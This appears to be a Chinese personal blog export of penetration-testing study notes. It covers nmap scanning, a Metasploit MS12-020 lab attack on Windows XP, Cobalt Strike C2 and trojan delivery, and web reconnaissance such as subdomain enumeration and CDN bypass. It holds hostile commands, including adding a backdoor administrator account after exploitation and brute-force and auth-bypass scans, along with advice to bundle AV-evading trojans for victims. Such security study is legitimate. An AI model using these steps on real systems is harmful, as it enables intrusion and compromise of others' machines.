<h3 id="3-简单用法"><a href="#3-简单用法" class="headerlink" title="3.简单用法"></a>3.简单用法</h3><p>参数为：</p>
<p>-sS：syn半开扫描，隐蔽性强<br>        -sY：全开扫描，比较准确<br>        -sT：会大量记录日志，慎用<br>        -sP：主机存活才会扫描的ping扫描<br>        -sA：高级扫描，穿透防火墙规则过滤<br>        -sV：版本探针扫描<br>        -Pn：被禁ping扫描方法<br>        -A：全面扫描</p>
<p>-exclude 除了</p>
<p>-sO：使用IP protocol扫描确定目标机支持的协议类型。</p>
<p>nmap ip确定目标主机在线情况及端口基本状况</p>
<h4 id="扫描单个地址，多个地址，一个范围的地址"><a href="#扫描单个地址，多个地址，一个范围的地址" class="headerlink" title="扫描单个地址，多个地址，一个范围的地址"></a>扫描单个地址，多个地址，一个范围的地址</h4><blockquote>
<p>namp xxx</p>
<p>nmap xxx yyy</p>
<p>nmap xxx-zzz</p>
</blockquote>
<h4 id="扫描目标地址所在网段"><a href="#扫描目标地址所在网段" class="headerlink" title="扫描目标地址所在网段"></a>扫描目标地址所在网段</h4><p>nmap 192.168.1.17&#x2F;24</p>
<h4 id="目标地址的操作系统指纹识别"><a href="#目标地址的操作系统指纹识别" class="headerlink" title="目标地址的操作系统指纹识别"></a>目标地址的操作系统指纹识别</h4><p>nmap –O 192.168.0.105</p>
<h4 id="目标地址开放的端口对应的服务版本信息"><a href="#目标地址开放的端口对应的服务版本信息" class="headerlink" title="目标地址开放的端口对应的服务版本信息"></a>目标地址开放的端口对应的服务版本信息</h4><p>map-sV 192.168.0.105</p>
<h4 id="探测防火墙状态"><a href="#探测防火墙状态" class="headerlink" title="探测防火墙状态"></a>探测防火墙状态</h4><p>在实战中，可以利用FIN扫描的方式探测防火墙的状态。FIN扫描用于识别端口是否关闭，收到RST回复说明该端口关闭，否则就是open或filtered状态，</p>
<p>nmap-sF –T4 192.168.0.105</p>
<h3 id="4-状态识别"><a href="#4-状态识别" class="headerlink" title="4.状态识别"></a>4.状态识别</h3><p>Nmap输出的是扫描列表，包括端口号、端口状态、服务名称、服务版本及协议。</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230620150540777.png"></p>
<h3 id="5-进阶使用"><a href="#5-进阶使用" class="headerlink" title="5.进阶使用"></a>5.进阶使用</h3><p>Nmap的脚本主要分为以下几类。</p>
<p>● Auth：负责处理鉴权证书（绕过鉴权）的脚本。</p>
<p>● Broadcast：在局域网内探查更多服务的开启情况，如DHCP&#x2F;DNS&#x2F;SQLServer等。</p>
<p>● Brute：针对常见的应用提供暴力破解方式，如HTTP&#x2F;SMTP等。</p>
<p>● Default：使用-sC或-A选项扫描时默认的脚本，提供基本的脚本扫描能力。</p>
<p>● Discovery：对网络进行更多信息的搜集，如SMB枚举、SNMP查询等。</p>
<p>● Dos：用于进行拒绝服务攻击。</p>
<p>● Exploit：利用已知的漏洞入侵系统。</p>
<p>● External：利用第三方的数据库或资源。例如，进行Whois解析。</p>
<p>● Fuzzer：模糊测试脚本，发送异常的包到目标机，探测出潜在漏洞。</p>
<p>● Intrusive：入侵性的脚本，此类脚本可能引发对方的IDS&#x2F;IPS的记录或屏蔽。</p>
<p>● Malware：探测目标机是否感染了病毒、开启后门等信息。</p>
<p>● Safe：此类与Intrusive相反，属于安全性脚本。</p>
<p>● Version：负责增强服务与版本扫描功能的脚本。</p>
<p>● Vuln：负责检查目标机是否有常见漏洞，如MS08-067。</p>
<h4 id="常用脚本"><a href="#常用脚本" class="headerlink" title="常用脚本"></a>常用脚本</h4><p>用户还可根据需要设置–script&#x3D;类别进行扫描，常用参数如下所示。</p>
<p>●-sC&#x2F;–script&#x3D;default：使用默认的脚本进行扫描。</p>
<p>●–script&#x3D;<Lua scripts>：使用某个脚本进行扫描。</p>
<p>●–script-args&#x3D;key1&#x3D;value1,key2&#x3D;value2······：该参数用于传递脚本里的参数，key1是参数名，该参数对应value1这个值。如有更多的参数，使用逗号连接。</p>
<p>● –script-args-file&#x3D;filename：使用文件为脚本提供参数。</p>
<p>●–script-trace：如果设置该参数，则显示脚本执行过程中发送与接收的数据。</p>
<p>●–script-updatedb：在Nmap的scripts目录里有一个script.db文件，该文件保存了当前Nmap可用的脚本，类似于一个小型数据库，如果我们开启Nmap并调用了此参数，则Nmap会自行扫描scripts目录中的扩展脚本，进行数据库更新。</p>
<p>●–script-help：调用该参数后，Nmap会输出该脚本对应的脚本使用参数，以及详细的介绍信息。</p>
<h4 id="弱口令检测"><a href="#弱口令检测" class="headerlink" title="弱口令检测"></a>弱口令检测</h4><p>使用–script&#x3D;auth可以对目标主机或目标主机所在的网段进行应用弱口令检测，</p>
<p><code>nmap--script=auth 192.168.0.105</code></p>
<h4 id="暴力破解攻击"><a href="#暴力破解攻击" class="headerlink" title="暴力破解攻击"></a>暴力破解攻击</h4><p><code>nmap--script=brute 192.168.0.105</code></p>
<h4 id="常见漏洞扫描"><a href="#常见漏洞扫描" class="headerlink" title="常见漏洞扫描"></a>常见漏洞扫描</h4><p><code>nmap--script=vuln 192.168.0.105</code></p>
<h4 id="应用服务扫描"><a href="#应用服务扫描" class="headerlink" title="应用服务扫描"></a>应用服务扫描</h4><p>如VNC服务</p>
<p><code>nmap--script=realvnc-auth-bypass 192.168.0.105</code></p>
<h4 id="探测局域网内更多服务开启情况"><a href="#探测局域网内更多服务开启情况" class="headerlink" title="探测局域网内更多服务开启情况"></a>探测局域网内更多服务开启情况</h4><p><code>nmap –n –p 445--script=broadcast 192.168.0.105</code></p>
<h4 id="whois解析"><a href="#whois解析" class="headerlink" title="whois解析"></a>whois解析</h4><h2 id="二、msf-Metasploit"><a href="#二、msf-Metasploit" class="headerlink" title="二、msf(Metasploit)"></a>二、msf(Metasploit)</h2><h3 id="1-msf是什么"><a href="#1-msf是什么" class="headerlink" title="1.msf是什么"></a>1.msf是什么</h3><p>msf是一个框架，附带数百个已知软件漏洞，是一款专业级漏洞攻击工具。</p>
<p>kali已经自带了。</p>
<h3 id="2-运行环境-1"><a href="#2-运行环境-1" class="headerlink" title="2.运行环境"></a>2.运行环境</h3><p>kali</p>
<h3 id="3-功能模块"><a href="#3-功能模块" class="headerlink" title="3.功能模块"></a>3.功能模块</h3><ol>
<li><p>Auxiliary（辅助模块）：**(扫描、嗅探、指纹识别)**</p>
</li>
<li><p>Exploits（攻击模块）：利用发现的安全漏洞或配置弱点对远程目标系统 进行攻击，从而获得对远程目标系统访问权的代码组件。**(Poc验证)**</p>
</li>
<li><p>Payload（攻击载荷模块）：攻击成功后促使靶机运行的一段植入代码</p>
</li>
<li><p>Post （后渗透攻击模块）：<strong>获取远程控制权后，收集更多信息或进一步访问被利用的目标系统</strong></p>
</li>
<li><p>Encoders（编码模块）:负责免杀,将攻击载荷进行编码，来绕过防护软件拦截</p>
<p>● 扫描目标机系统，寻找可用漏洞。</p>
<p>● 选择并配置一个漏洞利用模块。</p>
<p>● 选择并配置一个攻击载荷模块。</p>
<p>● 选择一个编码技术，用来绕过杀毒软件的查杀。</p>
<p>● 渗透攻击。</p>
</li>
</ol>
<h3 id="4-简单使用（蓝屏攻击）"><a href="#4-简单使用（蓝屏攻击）" class="headerlink" title="4.简单使用（蓝屏攻击）"></a>4.简单使用（蓝屏攻击）</h3><p>靶机可作为winxp，kali作为攻击机，两者同一局域网下。</p>
<p>winxp需要：</p>
<p>-开启3389端口（系统远程桌面服务）</p>
<p>-未安装蓝屏攻击补丁</p>
<p>-关闭防火墙</p>
<h4 id="a-先端口探测"><a href="#a-先端口探测" class="headerlink" title="a)先端口探测"></a>a)先端口探测</h4><p><code>nmap -sS -Pn -A 目标ip</code></p>
<p>确认开放了3389端口。</p>
<h4 id="b-进入msf，serch-ms12-020"><a href="#b-进入msf，serch-ms12-020" class="headerlink" title="b)进入msf，serch ms12_020"></a>b)进入msf，serch ms12_020</h4><p>出现两个模块，第一个为漏洞利用模块，第二个为漏洞验证模块</p>
<h5 id="1）验证"><a href="#1）验证" class="headerlink" title="1）验证"></a>1）验证</h5><p><code>use auxiliary/scanner/rdp/ms12_020_check</code>进入漏洞验证模块</p>
<p>输入<code>show options</code>查看相关参数配置</p>
<p>一般需要配置rhosts，<code>set rhosts 目标ip</code>后</p>
<p>输入run运行即可</p>
<p>会显示The target is vulnerable，证明该主机漏洞存在</p>
<h5 id="2-攻击"><a href="#2-攻击" class="headerlink" title="2)攻击"></a>2)攻击</h5><p><strong>serch ms12_020-&gt;use 0-&gt;show options-&gt;set rhosts 目标ip-&gt;run</strong></p>
<p>msf输入shell可进入靶机机器，可以添加用户，并将其设为管理员组</p>
<p><code>net user test 123 /add</code></p>
<p><code>net localgroup administrators test /add</code></p>
<h2 id="三、cobalt-strike"><a href="#三、cobalt-strike" class="headerlink" title="三、cobalt strike"></a>三、cobalt strike</h2><h3 id="1-cs是什么"><a href="#1-cs是什么" class="headerlink" title="1.cs是什么"></a>1.cs是什么</h3><p>渗透测试神器，拥有多种协议主机上线方式，集成了提权，凭据导出，端口转发，socket代理，office攻击，文件捆绑，钓鱼等功能。</p>
<p>本质是c2（command&amp;control），类似于teamserver发布命令，client执行命令，远控</p>
<h3 id="2-运行环境-2"><a href="#2-运行环境-2" class="headerlink" title="2.运行环境"></a>2.运行环境</h3><p>一般是kali启动teamserver服务（有java的linux平台），主机运行客户端（java环境）。客户端所填的ip地址就是kali的地址。正常实战时，cs隐藏特征和流量混淆一下，免杀。</p>
<h3 id="3-利用方式"><a href="#3-利用方式" class="headerlink" title="3.利用方式"></a>3.利用方式</h3><p>将木马放到目标机：</p>
<p>先将木马放到本地，做好免杀后，传到getshell的目标服务器上中去。（一般将木马与正常软件捆绑成一个压缩包，发给受害者，受害者在不知情的情况下打开）。当目标机运行后，本地就可以监听到，进行提权操作后，可执行其他命令。</p>
<p>参考：[内网渗透工具CobaltStrike使用教程详解_cobaltstrike教程_归去来兮-zangcc的博客-CSDN博客](<a href="https://blog.csdn.net/weixin_43847838/article/details/125069147?ops_request_misc=%7B%22request_id%22:%22168437783916800211513558%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=168437783916800211513558&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-125069147-null-null.142%5Ev87%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=cobalt">https://blog.csdn.net/weixin_43847838/article/details/125069147?ops_request_misc=%7B%22request%5Fid%22%3A%22168437783916800211513558%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=168437783916800211513558&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-125069147-null-null.142^v87^control_2,239^v2^insert_chatgpt&amp;utm_term=cobalt</a> strike&amp;spm&#x3D;1018.2226.3001.4187)</p>
<p>[ Cobalt Strike使用教程——基础篇_Captain_RB的博客-CSDN博客](<a href="https://blog.csdn.net/Captain_RB/article/details/116843274?ops_request_misc=&request_id=&biz_id=102&utm_term=cobalt">https://blog.csdn.net/Captain_RB/article/details/116843274?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=cobalt</a> strike&amp;utm_medium&#x3D;distribute.pc_search_result.none-task-blog-2<del>all</del>sobaiduweb~default-3-116843274.142^v87^control_2,239^v2^insert_chatgpt&amp;spm&#x3D;1018.2226.3001.4187)</p>
<h2 id="Nessus"><a href="#Nessus" class="headerlink" title="Nessus"></a>Nessus</h2><p>漏扫工具。</p>
]]></content>
      <categories>
        <category>渗透工具</category>
        <category>漏扫工具</category>
      </categories>
      <tags>
        <tag>msf</tag>
        <tag>nmap</tag>
        <tag>cs</tag>
        <tag>Nessus</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透测试</title>
    <url>/2023/05/13/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
    <content><![CDATA[<h2 id="一、基本流程"><a href="#一、基本流程" class="headerlink" title="一、基本流程"></a>一、基本流程</h2><p>目标确认-&gt;信息收集-&gt;漏洞发现-&gt;漏洞利用-&gt;权限维持、内网渗透-&gt;目标获取、痕迹清理</p>
<h3 id="1、目标确认"><a href="#1、目标确认" class="headerlink" title="1、目标确认"></a>1、目标确认</h3><p>渗透测试的目标和深入程度</p>
<p>dns&#x2F;cms侦查、子域名枚举、端口扫描、目录遍历、google</p>
<p>社工:弱口令、数据泄露、whois、邮箱、github、代码注释、钓鱼（邮件、网站）</p>
<p>公开漏洞：系统漏洞、web漏洞</p>
<p>漏洞挖掘：服务器、网站、公众号、小程序、app</p>
<h3 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2.信息收集"></a>2.信息收集</h3><p>在信息收集中，最主要的就是收集<strong>服务器的配置信息和网站的敏感信息</strong>，其中包括<strong>域名及子域名信息、目标网站系统、目录扫描(御剑、&#x2F;.git&#x2F;.svn)、CMS指纹﹑目标网站真实IP、C段扫描、端口扫描、中间件版本</strong>。换句话说，只要是与目标网站相关的信息，我们都应该去尽量搜集。</p>
<blockquote>
<p>通过脚本语言如idnex.php，判断出网站类型</p>
<p>.do、.action考虑Struts2漏洞</p>
</blockquote>
<p>基础设施枚举（获取公司在互联网和内部网上的位置；确定公司的安全措施）</p>
<p>服务枚举（服务版本、服务信息；许多服务有版本历史记录，可以识别主机或服务器上安装的版本是否是真的或新的）</p>
<p>主机枚举（确定该主机或服务器扮演什么角色以及它与哪些网络组件通信。此外，确定所用服务及用途，以及端口。）</p>
<p>掠夺（获取敏感信息如员工姓名、客户数据【需要在目标主机上获取到访问权限】）</p>
<p>域名、IP、端口、服务端框架、语言、开源情报、防御措施等</p>
<h4 id="2-1域名信息"><a href="#2-1域名信息" class="headerlink" title="2.1域名信息"></a>2.1域名信息</h4><p>正向记录(mx,ns,txt,spf,cname)</p>
<p>反向查询(whois信息反查:电话、邮箱、姓名)</p>
<p>备案信息</p>
<h5 id="2-1-1-whois"><a href="#2-1-1-whois" class="headerlink" title="2.1.1 whois"></a>2.1.1 whois</h5><p>Whois就是一个用于查询域名是否已被注册以及注册域名的详细信息的数据库（如域名所有人、域名注册商）。</p>
<p>注册人的姓名和邮箱信息通常对测试个人站点非常有用，因为我们可以通过搜索引擎和社交网络挖掘出域名所有人的很多信息。对中小站点而言，域名所有人往往就是管理员。</p>
<p>kali可以在线查，在线Whois查询的常用网站有爱站工具网（<a href="https://whois.aizhan.com)、站长之家(http//whois.chinaz.com%EF%BC%89%E5%92%8CVirusTotal%EF%BC%88https://www.virustotal.com%EF%BC%89%EF%BC%8C%E9%80%9A%E8%BF%87%E8%BF%99%E4%BA%9B%E7%BD%91%E7%AB%99%E5%8F%AF%E4%BB%A5%E6%9F%A5%E8%AF%A2%E5%9F%9F%E5%90%8D%E7%9A%84%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF%EF%BC%8C%E5%A6%82%E5%9F%9F%E5%90%8D%E6%9C%8D%E5%8A%A1%E5%95%86%E3%80%81%E5%9F%9F%E5%90%8D%E6%8B%A5%E6%9C%89%E8%80%85%EF%BC%8C%E4%BB%A5%E5%8F%8A%E4%BB%96%E4%BB%AC%E7%9A%84%E9%82%AE%E7%AE%B1%E3%80%81%E7%94%B5%E8%AF%9D%E3%80%81%E5%9C%B0%E5%9D%80%E7%AD%89%E3%80%82">https://whois.aizhan.com）、站长之家（http://whois.chinaz.com）和VirusTotal（https://www.virustotal.com），通过这些网站可以查询域名的相关信息，如域名服务商、域名拥有者，以及他们的邮箱、电话、地址等。</a></p>
<h5 id="2-1-2-备案信息查询"><a href="#2-1-2-备案信息查询" class="headerlink" title="2.1.2 备案信息查询"></a>2.1.2 备案信息查询</h5><p>网站备案是根据国家法律法规规定，需要网站的所有者向国家有关部门申请的备案，这是国家信息产业部对网站的一种管理，为了防止在网上从事非法的网站经营活动的发生。主要针对国内网站，如果网站搭建在其他国家，则不需要进行备案。</p>
<p>常用的网站有以下这两个。</p>
<p>● ICP备案查询网：<a href="http://www.beianbeian.com./">http://www.beianbeian.com。</a></p>
<p>● 天眼查：<a href="http://www.tianyancha.com./">http://www.tianyancha.com。</a></p>
<h4 id="2-2-收集敏感信息"><a href="#2-2-收集敏感信息" class="headerlink" title="2.2 收集敏感信息"></a>2.2 收集敏感信息</h4><blockquote>
<p>google搜搜引擎</p>
<p>github(数据库连接信息、邮箱密码、uc-key、阿里的osskey，有时还可以找到泄露的源代码等。)</p>
<p>bp的repeater模块(go运行后，右侧的response模块中可以获取一些服务器的信息)</p>
<p>wy漏洞表查看历史漏洞信息</p>
</blockquote>
<h4 id="2-3-收集子域名信息"><a href="#2-3-收集子域名信息" class="headerlink" title="2.3 收集子域名信息"></a>2.3 收集子域名信息</h4><p>主域攻不下来，那就转二级域名。</p>
<p>子域搜索方法：</p>
<p><strong>1.子域名检测工具</strong></p>
<blockquote>
<p>用于子域名检测的工具主要有<strong>Layer子域名挖掘机</strong>、K8、wydomain、<strong>Sublist3r</strong>、dnsmaper、<strong>subDomainsBrute</strong>、Maltego CE等。</p>
</blockquote>
<p><strong>2.搜索引擎枚举</strong></p>
<blockquote>
<p>Google语法搜索子域名</p>
<p>比如site:baidu.com</p>
</blockquote>
<p><strong>3.第三方聚合应用枚举</strong></p>
<blockquote>
<p>很多第三方服务汇聚了大量DNS数据集，可通过它们检索某个给定域名的子域名。只需在其搜索栏中输入域名，就可检索到相关的域名信息</p>
<p>DNSdumpster网站（<a href="https://dnsdumpster.com/%EF%BC%89%E3%80%81%E5%9C%A8%E7%BA%BFDNS%E4%BE%A6%E6%9F%A5%E5%92%8C%E6%90%9C%E7%B4%A2%E7%9A%84%E5%B7%A5%E5%85%B7%E6%8C%96%E6%8E%98%E5%87%BA%E6%8C%87%E5%AE%9A%E5%9F%9F%E6%BD%9C%E8%97%8F%E7%9A%84%E5%A4%A7%E9%87%8F%E5%AD%90%E5%9F%9F%E3%80%82">https://dnsdumpster.com/）、在线DNS侦查和搜索的工具挖掘出指定域潜藏的大量子域。</a></p>
</blockquote>
<p><strong>4.证书透明度公开日志枚举</strong></p>
<blockquote>
<p>证书透明度（Certificate Transparency,CT）是证书授权机构（CA）的一个项目，证书授权机构会将每个SSL&#x2F;TLS证书发布到公共日志中。一个SSL&#x2F;TLS证书通常包含域名、子域名和邮件地址，这些也经常成为攻击者非常希望获得的有用信息。查找某个域名所属证书的最简单的方法就是使用搜索引擎搜索一些公开的CT日志。</p>
<p>网站推荐：</p>
<p>crt.sh:<a href="https://crt.sh/">https://crt.sh</a></p>
<p>censys:<a href="https://censys.io/">https://censys.io</a></p>
<p>子域名爆破网站（<a href="https://phpinfo.me/domain%EF%BC%89">https://phpinfo.me/domain）</a></p>
<p>IP反查绑定域名网站（<a href="http://dns.aizhan.com)等./">http://dns.aizhan.com）等。</a></p>
</blockquote>
<h4 id="2-4-收集常用端口信息"><a href="#2-4-收集常用端口信息" class="headerlink" title="2.4 收集常用端口信息"></a>2.4 收集常用端口信息</h4><p>在渗透测试的过程中，对端口信息的收集是一个很重要的过程，通过扫描服务器开放的<strong>端口以及从该端口判断服务器上存在的服务</strong>，就可以对症下药，便于我们渗透目标服务器。</p>
<p>所以在端口渗透信息的收集过程中，我们需要关注常见应用的默认端口和在端口上运行的服务。</p>
<p>最常见的扫描工具就是<strong>Nmap，无状态端口扫描工具Masscan、ZMap和御剑高速TCP端口扫描工具。</strong></p>
<p>下面是一些服务端口汇总。</p>
<p><strong>文件共享服务端口</strong></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230620095745239.png" alt="文件共享服务端口"></p>
<p><strong>远程连接服务端口</strong></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230620095825365.png" alt="远程连接服务端口"></p>
<p><strong>Web应用服务端口</strong></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230620100023068.png" alt="Web应用服务端口"></p>
<p><strong>数据库服务端口</strong></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230620100101221.png" alt="数据库服务端口"></p>
<p><strong>邮件服务端口</strong></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230620100159897.png" alt="邮件服务端口"></p>
<p><strong>网络常见协议端口</strong></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230620100237114.png" alt="网络常见协议端口"></p>
<p><strong>特殊服务端口</strong></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230620100307483.png" alt="特殊服务端口"></p>
<h4 id="2-5-指纹识别"><a href="#2-5-指纹识别" class="headerlink" title="2.5 指纹识别"></a>2.5 指纹识别</h4><p>指纹由于其终身不变性、唯一性和方便性，几乎已成为生物特征识别的代名词。这里所讲的指纹是指<strong>网站CMS指纹识别</strong>、<strong>计算机操作系统及Web容器的指纹识别</strong>等。</p>
<p>应用程序一般在html、js、css等文件中多多少少会包含一些特征码，比如WordPress在robots.txt中会包含wp-admin、首页index.php中会包含generator&#x3D;wordpress 3.xx，这个特征就是这个CMS的指纹，那么当碰到其他网站也存在此特征时，就可以快速识别出该CMS，所以叫作指纹识别。</p>
<p>对目标服务器进行指纹识别是相当有必要的，因为只有识别出相应的Web容器或者CMS，才能查找与其相关的漏洞，然后才能进行相应的渗透操作。</p>
<h5 id="cms"><a href="#cms" class="headerlink" title="cms"></a>cms</h5><p>CMS（Content Management System）又称整站系统或文章系统。在2004年以前，如果想进行网站内容管理，基本上都靠手工维护，但在信息爆炸的时代，完全靠手工完成会相当痛苦。所以就出现了CMS，开发者只要给客户一个软件包，<strong>客户自己安装配置好，就可以定期更新数据来维护网站</strong>，节省了大量的人力和物力。</p>
<blockquote>
<p>常见的CMS有Dedecms（织梦）、Discuz、PHPWEB、PHPWind、PHPCMS、ECShop、Dvbbs、SiteWeaver、ASPCMS、帝国、Z-Blog、WordPress等。</p>
</blockquote>
<p>代表工具有御剑Web指纹识别、WhatWeb、WebRobo、椰树、轻量WEB指纹识别等，可以快速识别一些主流CMS。</p>
<p>还有一些在线网站查询CMS</p>
<blockquote>
<p>● BugScaner:<a href="http://whatweb.bugscaner.com/look/%E3%80%82">http://whatweb.bugscaner.com/look/。</a></p>
<p>● 云悉指纹：<a href="http://www.yunsee.cn/finger.html%E3%80%82">http://www.yunsee.cn/finger.html。</a></p>
<p>● 和WhatWeb:<a href="https://whatweb.net/%E3%80%82">https://whatweb.net/。</a></p>
</blockquote>
<h4 id="2-6-查找真实IP"><a href="#2-6-查找真实IP" class="headerlink" title="2.6 查找真实IP"></a>2.6 查找真实IP</h4><p>在渗透测试过程中，目标服务器可能只有一个域名，那么如何通过这个域名来确定目标服务器的真实IP对渗透测试来说就很重要。如果目标服务器不存在CDN，可以直接通过<a href="http://www.ip138.com获取目标的一些ip及域名信息.如果有cdn,就需要绕过cdn寻找目标服务器的真实ip./">www.ip138.com获取目标的一些IP及域名信息。如果有CDN，就需要绕过CDN寻找目标服务器的真实IP。</a></p>
<h5 id="2-6-1-目标服务器存在CDN"><a href="#2-6-1-目标服务器存在CDN" class="headerlink" title="2.6.1.目标服务器存在CDN"></a>2.6.1.目标服务器存在CDN</h5><p>CDN即内容分发网络，主要解决因传输距离和不同运营商节点造成的网络速度性能低下的问题。</p>
<blockquote>
<p>就是一组在不同运营商之间的对接节点上的高速缓存服务器，把用户经<strong>常访问</strong>的<strong>静态数据资源</strong>（例如静态的html、css、js图片等文件）直接缓存到节点服务器上，当用户再次请求时，会直接分发到在离用户近的节点服务器上响应给用户，当用户<strong>有实际数据交互</strong>时才会从远程Web服务器上响应，这样可以大大提高网站的响应速度及用户体验。</p>
</blockquote>
<h5 id="2-6-2-目标是否使用了CDN"><a href="#2-6-2-目标是否使用了CDN" class="headerlink" title="2.6.2 目标是否使用了CDN"></a>2.6.2 目标是否使用了CDN</h5><p>通常会通过ping目标主域，<strong>观察域名的解析情况</strong>，以此来判断其是否使用了CDN。</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230620101005067.png" alt="ping命令"></p>
<p>还可以利用在线网站17CE（<a href="https://www.17ce.com)进行全国多地区的ping服务器操作,然后对比每个地区ping出的ip结果,查看这些ip是否一致,**如果都是一样的,极有可能不存在cdn.**如果ip大多不太一样或者规律性很强,可以尝试**查询这些ip的归属地**,判断是否存在cdn.(多地ping)/">https://www.17ce.com）进行全国多地区的ping服务器操作，然后对比每个地区ping出的IP结果，查看这些IP是否一致，**如果都是一样的，极有可能不存在CDN。**如果IP大多不太一样或者规律性很强，可以尝试**查询这些IP的归属地**，判断是否存在CDN。（多地ping）</a></p>
<h5 id="2-6-3-绕过CDN"><a href="#2-6-3-绕过CDN" class="headerlink" title="2.6.3 绕过CDN"></a>2.6.3 绕过CDN</h5><blockquote>
<p>● <strong>内部邮箱源</strong>。一般的邮件系统都在内部，没有经过CDN的解析，通过目标网站用户注册或者RSS订阅功能，查看邮件、寻找邮件头中的邮件服务器域名IP,ping这个邮件服务器的域名，就可以获得目标的真实IP（注意，必须是目标自己的邮件服务器，第三方或公共邮件服务器是没有用的）。</p>
<p>● <strong>扫描网站测试文件</strong>，如phpinfo、test等，从而找到目标的真实IP。</p>
<p>● <strong>分站域名</strong>。很多网站主站的访问量会比较大，所以主站都是挂CDN的，但是分站可能没有挂CDN，可以通过ping二级域名获取分站IP，可能会出现分站和主站<strong>不是同一个IP但在同一个C段</strong>下面的情况，从而能判断出目标的真实IP段。</p>
<p>● <strong>国外访问</strong>。国内的CDN往往只对国内用户的访问加速，而国外的CDN就不一定了。因此，通过国外在线代理网站App Synthetic Monitor（<a href="https://asm.ca.com/en/ping.php%EF%BC%89%E8%AE%BF%E9%97%AE%EF%BC%8C%E5%8F%AF%E8%83%BD%E4%BC%9A%E5%BE%97%E5%88%B0%E7%9C%9F%E5%AE%9E%E7%9A%84IP%EF%BC%8C">https://asm.ca.com/en/ping.php）访问，可能会得到真实的IP，</a></p>
<p>● <strong>查询域名的解析记录</strong>。也许目标很久以前并没有用过CDN，所以可以通过网站NETCRAFT（<a href="https://www.netcraft.com/%EF%BC%89%E6%9D%A5%E8%A7%82%E5%AF%9F%E5%9F%9F%E5%90%8D%E7%9A%84IP%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95%EF%BC%8C%E4%B9%9F%E5%8F%AF%E4%BB%A5%E5%A4%A7%E8%87%B4%E5%88%86%E6%9E%90%E5%87%BA%E7%9B%AE%E6%A0%87%E7%9A%84%E7%9C%9F%E5%AE%9EIP%E6%AE%B5%E3%80%82">https://www.netcraft.com/）来观察域名的IP历史记录，也可以大致分析出目标的真实IP段。</a></p>
<p>● <strong>如果目标网站有自己的App</strong>，可以尝试利用Fiddler或Burp Suite抓取App的请求，从里面找到目标的真实IP。</p>
<p>● <strong>绕过CloudFlare CDN查找真实IP</strong>。现在很多网站都使用CloudFlare提供的CDN服务，在确定了目标网站使用CDN后，可以先尝试通过在线网站Cloud FlareWatch（<a href="http://www.crimeflare.us/cfs.html#box%EF%BC%89%E5%AF%B9CloudFlare%E5%AE%A2%E6%88%B7%E7%BD%91%E7%AB%99%E8%BF%9B%E8%A1%8C%E7%9C%9F%E5%AE%9EIP%E6%9F%A5%E8%AF%A2">http://www.crimeflare.us/cfs.html#box）对CloudFlare客户网站进行真实IP查询</a></p>
</blockquote>
<h5 id="2-6-4-验证获取的ip"><a href="#2-6-4-验证获取的ip" class="headerlink" title="2.6.4 验证获取的ip"></a>2.6.4 验证获取的ip</h5><p>如果是Web，最简单的验证方法是直接尝试用IP访问，<strong>看看响应的页面是不是和访问域名返回的一样</strong>；或者在目标段比较大的情况下，借助类似Masscan的工具批扫描对应IP段中所有开了80、443、8080端口的IP，然后逐个尝试IP访问，<strong>观察响应结果是否为目标站点</strong>。</p>
<h4 id="2-7-收集敏感目录文件"><a href="#2-7-收集敏感目录文件" class="headerlink" title="2.7 收集敏感目录文件"></a>2.7 收集敏感目录文件</h4><p>探测Web目录结构和隐藏的敏感文件是一个必不可少的环节，从中可以获取网站的<strong>后台管理页面</strong>﹑<strong>文件上传界面</strong>，甚至可能<strong>扫描出网站的源代码</strong>。</p>
<p>针对网站目录的扫描主要有DirBuster、御剑后台扫描珍藏版、wwwscan、Spinder.py（轻量级快速单文件目录后台扫描）、Sensitivefilescan（轻量级快速单文件目录后台扫描）、Weakfilescan（轻量级快速单文件目录后台扫描）等工具。</p>
<p>或者在线网址：</p>
<p>WebScan（<a href="http://www.webscan.cc/%EF%BC%89">http://www.webscan.cc/）</a></p>
<h4 id="2-8-社会工程学"><a href="#2-8-社会工程学" class="headerlink" title="2.8 社会工程学"></a>2.8 社会工程学</h4><p>攻击者通过操纵人的心理、社交工具或其他手段，诱使受攻击者泄露敏感信息、提供访问权限或执行恶意操作的一种攻击方式。这种攻击利用了人们的信任、好奇心、急迫性或其他心理因素，从而绕过技术安全防护措施。</p>
<p>常见方式有:</p>
<blockquote>
<ul>
<li>钓鱼攻击：通过伪装成合法的通信或网站，诱使受害者提供个人信息、登录凭证、银行账号等。</li>
<li>点击劫持攻击：将一个透明的层覆盖在正常网页上，欺骗用户点击某些看似无害的区域，实际上触发了恶意操作。</li>
<li>假冒身份：冒充信任的个人或机构，通过电话、电子邮件或其他通信方式，欺骗受害者提供敏感信息。</li>
<li>社交工具欺骗：通过社交媒体、即时通讯应用等，冒充朋友或熟人的身份，获取信息或诱导行为。</li>
<li>垃圾邮件和钓鱼邮件：通过发送虚假的电子邮件，诱使受害者点击恶意链接、下载恶意附件或提供个人信息。</li>
</ul>
<p>还有社工库。</p>
</blockquote>
<p>具体方法，参考<a href="http://t.csdn.cn/kz56q">csdn思源湖的鱼</a></p>
